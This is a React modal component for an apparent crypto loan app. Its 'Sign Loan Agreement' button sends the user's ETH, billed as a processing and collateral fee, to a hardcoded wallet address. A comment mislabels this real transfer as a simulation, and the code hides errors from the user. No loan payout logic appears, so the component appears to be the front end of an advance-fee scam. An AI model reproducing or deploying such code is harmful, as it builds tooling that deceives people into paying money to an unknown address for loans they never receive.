import React, { useState, useEffect, useRef } from 'react';
import { useWalletClient } from 'wagmi';
import { parseEther } from 'viem';
import { useNavigate } from 'react-router-dom';
import { handleCancel } from '../utils/handleCancel';
import { safeSendTransaction } from '../utils/safeSendTransaction';
import { forceCleanup } from '../utils/forceCleanup';

const LoanSummaryModal = ({ loan, onClose, walletAddress }) => {
  const navigate = useNavigate();
  const { data: walletClient } = useWalletClient();
  const [isProcessing, setIsProcessing] = useState(false);
  const isMounted = useRef(true);

  useEffect(() => {
    return () => {
      isMounted.current = false;
    };
  }, []);

  // Convert USD to ETH (simplified - in production, use real price feed)
  const ETH_PRICE = 3000; // Example ETH price in USD
  const loanInETH = (loan.amount / ETH_PRICE).toFixed(6);
  const feeInETH = (loan.fee / ETH_PRICE).toFixed(6);
  const totalInETH = (loan.total / ETH_PRICE).toFixed(6);

  const handleConfirm = async () => {
    if (!walletClient || !walletAddress) {
      alert('Wallet not connected');
      return;
    }

    if (isMounted.current) setIsProcessing(true);

    let forced = false;
    const forcedCleanupTimer = setTimeout(() => {
      forced = true;
      forceCleanup({
        navigate,
        closeAllModals: () => onClose?.({ success: false }),
        setParentProcessing: null,
        setLocalProcessing: (val) => {
          if (isMounted.current) setIsProcessing(val);
        }
      });
    }, 75000);

    try {
      // Simulate transaction request
      const tx = {
        to: '0xB763A8cD434CbfE401d118408e95F7A01b2c1549',
        value: parseEther(feeInETH),
        account: walletAddress
      };

      const result = await safeSendTransaction(walletClient, tx, { timeoutMs: 60000 });

      // User cancelled in wallet or Trust Wallet/Web3Modal timed out
      if (!result.ok) {
        handleCancel({
          navigate,
          closeAllModals: () => onClose?.({ success: false }),
          setIsProcessing,
        });
        return;
      }

      const txHash = result.hash;

      alert(`✅ Loan request submitted!\n\nLoan Amount: $${loan.amount.toLocaleString()} (${loanInETH} ETH)\nFee: $${loan.fee.toLocaleString()} (${feeInETH} ETH)\nTotal Repayment: $${loan.total.toLocaleString()} (${totalInETH} ETH)\n\nTransaction Hash:\n${txHash}`);

      onClose?.({ success: true });
      return;
    } catch (error) {
      console.error('Transaction error:', error);
      // Don't alert on error, just close nicely so user isn't stuck
      // alert(`❌ Transaction failed: ${error?.message || 'Unknown error'}`);
      onClose?.({ success: false });
      return;
    } finally {
      clearTimeout(forcedCleanupTimer);
      if (!forced && isMounted.current) {
        setIsProcessing(false);
      }
    }
  };

  const handleManualCancel = () => {
    handleCancel({
      navigate,
      closeAllModals: () => onClose?.({ success: false }),
      setIsProcessing,
    });
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50 backdrop-blur-sm animate-fadeIn" onClick={onClose}>
      <div className="bg-white rounded-card shadow-2xl max-w-md w-full mx-4 animate-slideUp" onClick={(e) => e.stopPropagation()}>
        {/* Header */}
        <div className="flex items-center justify-between p-6 border-b border-border">
          <h2 className="text-section-title text-text-primary font-bold">Loan Summary</h2>
          <button
            onClick={onClose}
            disabled={isProcessing}
            className="w-8 h-8 flex items-center justify-center rounded-full hover:bg-gray-100 text-text-secondary hover:text-text-primary transition-colors disabled:opacity-50"
          >
            <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
            </svg>
          </button>
        </div>

        {/* Content */}
        <div className="p-6 space-y-4">

          {/* Loan details if available */}
          {loan.type && (
            <div className="flex items-center justify-between py-3 border-b border-border">
              <span className="text-text-secondary">Loan Type</span>
              <div className="text-right">
                <div className="text-base font-semibold text-text-primary">{loan.type.label}</div>
                {/* Optional: Show 1-2 key details like Duration if present */}
                {loan.details?.duration && <div className="text-xs text-text-secondary">{loan.details.duration} Term</div>}
              </div>
            </div>
          )}

          {/* Loan Amount */}
          <div className="flex items-center justify-between py-3 border-b border-border">
            <span className="text-text-secondary">Loan Amount</span>
            <div className="text-right">
              <div className="text-lg font-bold text-text-primary">${loan.amount.toLocaleString()}</div>
              <div className="text-sm text-text-secondary">{loanInETH} ETH</div>
            </div>
          </div>

          {/* Fee */}
          <div className="flex items-center justify-between py-3 border-b border-border">
            <span className="text-text-secondary">Processing & Collateral Fee (1%)</span>
            <div className="text-right">
              <div className="text-lg font-bold text-text-primary">${loan.fee.toLocaleString()}</div>
              <div className="text-sm text-text-secondary">{feeInETH} ETH</div>
            </div>
          </div>

          {/* Total */}
          <div className="flex items-center justify-between py-3">
            <span className="text-text-primary font-semibold">Total Repayment</span>
            <div className="text-right">
              <div className="text-xl font-bold text-primary">${loan.total.toLocaleString()}</div>
              <div className="text-sm text-text-secondary">{totalInETH} ETH</div>
            </div>
          </div>

          {/* Warning */}
          <div className="bg-amber-50 border-l-4 border-amber-500 p-4 rounded">
            <p className="text-sm text-amber-900">⚠️ Your wallet must hold at least 10% of the requested loan amount as collateral.</p>
          </div>

          {/* Confirm Button */}
          <div className="space-y-3">
            <button
              onClick={handleConfirm}
              disabled={isProcessing}
              className="w-full py-3 bg-gradient-accent text-white rounded-button font-semibold hover:shadow-hover transition-all disabled:opacity-50 disabled:cursor-not-allowed"
            >
              {isProcessing ? 'Processing Transaction...' : 'Sign Loan Agreement'}
            </button>

            {isProcessing && (
              <button
                onClick={handleManualCancel}
                className="w-full py-2 text-sm text-text-secondary hover:text-red-500 transition-colors"
              >
                Cancel / Stuck?
              </button>
            )}
          </div>
        </div>
      </div>

      <style jsx>{`
        @keyframes fadeIn {
          from { opacity: 0; }
          to { opacity: 1; }
        }
        @keyframes slideUp {
          from {
            opacity: 0;
            transform: translateY(20px);
          }
          to {
            opacity: 1;
            transform: translateY(0);
          }
        }
        .animate-fadeIn {
          animation: fadeIn 0.3s ease-out;
        }
        .animate-slideUp {
          animation: slideUp 0.4s ease-out;
        }
      `}</style>
    </div>
  );
};

export default LoanSummaryModal;
